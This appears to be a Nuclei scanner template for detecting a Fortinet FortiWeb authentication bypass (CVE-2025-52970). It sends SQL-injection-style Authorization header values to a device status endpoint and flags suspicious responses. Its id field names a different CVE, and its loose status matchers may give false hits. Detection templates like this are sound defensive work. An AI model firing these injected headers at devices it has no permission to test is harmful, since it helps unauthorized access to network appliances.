id: CVE-2024-8353
info:
  name: Fortinet FortiWeb - CVE-2025-52970 - Auth bypass (non-destructive probes)
  author: gsharma101
  severity: high
  description: >
    Non-destructive probes for Fortinet FortiWeb auth bypass (CVE-2025-52970).
    Public PoCs abuse the Authorization header (e.g. Authorization: Bearer ';<injection>') against
    /api/fabric/device/status to trigger SQLi and further exploitation. This template performs
    safe read-only probes using harmless placeholders and flags unexpected responses (HTTP 200/500
    or JSON fields like "token" / "role" / "super_admin"). Do NOT run destructive payloads.
  reference:
    - https://pwner.gg/blog/2025-08-13-fortiweb-cve-2025-52970
    - https://github.com/Hex00-0x4/FortiWeb-CVE-2025-52970-Authentication-Bypass
  tags: fortinet,fortiweb,cve-2025-52970,auth-bypass

requests:
  - id: probe-bearer-test
    method: GET
    path:
      - "{{BaseURL}}/api/fabric/device/status"
    headers:
      Authorization: "Bearer ';test"
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "token"
          - "\"role\""
          - "super_admin"
      - type: status
        status:
          - 200
          - 500

  - id: probe-bearer-comment
    method: GET
    path:
      - "{{BaseURL}}/api/fabric/device/status"
    headers:
      Authorization: "Bearer ';--"
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "token"
          - "\"role\""
          - "super_admin"
      - type: status
        status:
          - 200
          - 500

  - id: probe-bearer-escaped
    method: GET
    path:
      - "{{BaseURL}}/api/fabric/device/status"
    headers:
      Authorization: "Bearer '\\';--"
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "token"
          - "\"role\""
          - "super_admin"
      - type: status
        status:
          - 200
          - 500
